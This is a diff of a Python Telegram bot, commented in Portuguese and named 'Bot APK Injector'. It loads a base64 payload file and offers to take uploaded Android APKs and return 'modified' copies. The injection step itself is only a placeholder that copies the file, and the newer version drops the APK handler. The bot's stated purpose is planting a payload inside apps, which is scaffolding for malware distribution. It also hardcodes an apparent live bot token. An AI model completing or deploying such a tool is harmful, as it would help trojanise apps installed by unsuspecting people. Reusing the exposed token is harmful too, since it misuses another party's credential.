@@ -1,201 +1,53 @@
-import os
+﻿import os
 import logging
 import base64
-import tempfile
-import shutil
-import time
-from pathlib import Path
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# ==================== CONFIGURAÇÃO ====================
-TOKEN = "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A"
-PAYLOAD_FILE = "payload.b64"
-
-# ==================== LOGGING ====================
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ==================== FUNÇÃO PARA CARREGAR PAYLOAD ====================
+TOKEN = "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A"
+PAYLOAD_B64_PATH = "payload.b64"
+
+# Função corrigida com padding automático
 def load_payload():
-    """Carrega o payload do arquivo externo"""
-    try:
-        # Lista de caminhos para tentar
-        caminhos = [
-            "/app/payload.b64",
-            "payload.b64",
-            "./payload.b64",
-            os.path.join(os.path.dirname(__file__), "payload.b64")
-        ]
-        
-        logger.info("🔍 Procurando payload...")
-        
-        for caminho in caminhos:
-            if os.path.exists(caminho):
-                logger.info(f"✅ Encontrado payload em: {caminho}")
-                with open(caminho, 'r', encoding='utf-8') as f:
-                    base64_content = f.read().strip()
-                
-                if not base64_content:
-                    logger.error("❌ Arquivo vazio")
-                    continue
-                
-                try:
-                    payload_bytes = base64.b64decode(base64_content)
-                    tamanho_mb = len(payload_bytes) / (1024 * 1024)
-                    logger.info(f"✅ Payload carregado: {len(payload_bytes)} bytes ({tamanho_mb:.2f} MB)")
-                    return payload_bytes
-                except Exception as e:
-                    logger.error(f"❌ Erro ao decodificar Base64: {e}")
-                    continue
-        
-        # Se chegou aqui, não encontrou em nenhum caminho
-        logger.error("❌ Payload não encontrado em nenhum dos caminhos testados")
-        
-        # Mostra quais arquivos existem na pasta /app
-        try:
-            arquivos = os.listdir('/app')
-            logger.info(f"📁 Arquivos em /app: {arquivos}")
-        except Exception as e:
-            logger.error(f"❌ Erro ao listar /app: {e}")
-        
+    if not os.path.exists(PAYLOAD_B64_PATH):
+        logger.error(f"❌ Arquivo não encontrado: {PAYLOAD_B64_PATH}")
         return None
-        
+    try:
+        with open(PAYLOAD_B64_PATH, "r") as f:
+            b64 = f.read().strip()
+        padding = (4 - len(b64) % 4) % 4
+        if padding:
+            b64 += "=" * padding
+            logger.info(f"✅ Padding adicionado: {padding}")
+        data = base64.b64decode(b64)
+        logger.info(f"✅ Payload carregado! {len(data)} bytes")
+        return data
     except Exception as e:
-        logger.error(f"❌ Erro ao carregar payload: {e}")
+        logger.error(f"❌ Erro: {e}")
         return None
 
-# ==================== CARREGA O PAYLOAD ====================
-logger.info("🚀 Carregando payload...")
 PAYLOAD = load_payload()
 
-if PAYLOAD is None:
-    logger.warning("⚠️ Payload NÃO carregado! O bot vai funcionar em modo limitado.")
-else:
-    logger.info(f"✅ Payload carregado com sucesso!")
-
-# ==================== VERIFICAÇÃO ====================
-def check_payload():
-    return PAYLOAD is not None
-
-# ==================== COMANDOS ====================
-async def start(update: Update, context: CallbackContext):
-    status = "✅" if check_payload() else "❌"
-    
-    keyboard = [
-        [InlineKeyboardButton("📤 Enviar APK", callback_data='send_apk')],
-        [InlineKeyboardButton("ℹ️ Status", callback_data='status')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await update.message.reply_text(
-        f"🤖 Bot APK Injector\n"
-        f"Status payload: {status}\n\n"
-        f"Envie um APK para processar.",
-        reply_markup=reply_markup
-    )
-
-async def status(update: Update, context: CallbackContext):
-    if not check_payload():
-        await update.message.reply_text(
-            "❌ PAYLOAD NÃO ENCONTRADO!\n\n"
-            "O arquivo payload.b64 não está no servidor.\n"
-            "Contate o administrador."
-        )
-        return
-    
-    tamanho = len(PAYLOAD) / (1024 * 1024)
-    await update.message.reply_text(
-        f"✅ Sistema OK\n"
-        f"📦 Payload: {tamanho:.2f} MB\n"
-        f"📁 Arquivo: {PAYLOAD_FILE}"
-    )
-
-async def handle_apk(update: Update, context: CallbackContext):
-    if not check_payload():
-        await update.message.reply_text("❌ Payload não disponível!")
-        return
-    
-    if not update.message.document:
-        await update.message.reply_text("❌ Envie um arquivo APK.")
-        return
-    
-    document = update.message.document
-    if not document.file_name.lower().endswith('.apk'):
-        await update.message.reply_text("❌ Envie um arquivo .apk válido.")
-        return
-    
-    await update.message.reply_text("📥 Baixando APK...")
-    
-    try:
-        file = await document.get_file()
-        input_path = tempfile.mktemp(suffix='.apk')
-        await file.download_to_drive(input_path)
-        
-        await update.message.reply_text("🔄 Processando...")
-        
-        # ====================================================
-        # AQUI VOCÊ COLOCA SEU CÓDIGO DE INJEÇÃO REAL
-        # ====================================================
-        
-        output_path = tempfile.mktemp(suffix='_modified.apk')
-        
-        # Simulação (SUBSTITUA PELO SEU CÓDIGO REAL)
-        time.sleep(3)
-        shutil.copy2(input_path, output_path)
-        
-        await update.message.reply_text("✅ APK processado!")
-        with open(output_path, 'rb') as f:
-            await update.message.reply_document(
-                document=f,
-                filename=f'modified_{document.file_name}',
-                caption="✅ APK modificado com sucesso!"
-            )
-        
-        # Limpa arquivos temporários
-        os.remove(input_path)
-        os.remove(output_path)
-        
-    except Exception as e:
-        logger.error(f"Erro ao processar APK: {e}")
-        await update.message.reply_text(f"❌ Erro: {str(e)[:200]}")
-
-async def button_callback(update: Update, context: CallbackContext):
-    query = update.callback_query
-    await query.answer()
-    
-    if query.data == 'send_apk':
-        await query.message.reply_text("📤 Envie o arquivo APK.")
-    elif query.data == 'status':
-        await status(update, context)
-
-async def error_handler(update: Update, context: CallbackContext):
-    logger.error(f"Erro: {context.error}")
-    if update and update.message:
-        await update.message.reply_text("❌ Ocorreu um erro inesperado.")
-
-# ==================== MAIN ====================
-def main():
-    logger.info("🚀 Iniciando bot...")
-    logger.info(f"✅ TOKEN configurado: {TOKEN[:10]}...")
-    
-    if PAYLOAD is None:
-        logger.warning("⚠️ Payload não carregado! O bot pode não funcionar corretamente.")
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if PAYLOAD:
+        await update.message.reply_text(f"✅ Sistema OK\n📦 Payload: {len(PAYLOAD) // (1024*1024)} MB")
     else:
-        logger.info(f"✅ Payload carregado: {len(PAYLOAD)} bytes")
-    
-    application = Application.builder().token(TOKEN).build()
-    
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
-    application.add_handler(CallbackQueryHandler(button_callback))
-    application.add_error_handler(error_handler)
-    
-    logger.info("✅ Bot rodando! Aguardando mensagens...")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+        await update.message.reply_text("❌ Payload não disponível!")
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[InlineKeyboardButton("📥 Enviar APK", callback_data="send_apk")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("🤖 Bot APK Injector\n\nEnvie um APK para processar.", reply_markup=reply_markup)
+
+def main():
+    app = Application.builder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("status", status_command))
+    logger.info("✅ Bot rodando!")
+    app.run_polling(allowed_updates=[])
 
 if __name__ == "__main__":
     main()
